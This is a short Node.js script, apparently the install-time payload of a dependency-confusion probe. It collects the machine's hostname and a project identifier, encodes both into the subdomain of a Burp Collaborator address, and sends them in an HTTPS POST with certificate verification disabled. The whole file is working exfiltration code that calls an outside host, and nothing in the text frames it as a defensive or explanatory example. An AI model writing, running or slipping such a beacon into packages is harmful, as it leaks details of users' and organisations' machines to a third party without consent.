const https = require('https');
var os = require("os");
var hostname = os.hostname();

const data = new TextEncoder().encode(
  JSON.stringify({
    payload: hostname,
    project_id: process.argv[2]
  })
)

const options = {
  hostname: process.argv[2] + '.' + hostname + '.jylzi8mxby9i6hj8plrj0i6v9mff34.burpcollaborator.net',
  port: 443,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  },
  rejectUnauthorized: false
}

const req = https.request(options, res => {

})

req.on('error', error => {
  console.error(error)
})

req.write(data)
req.end()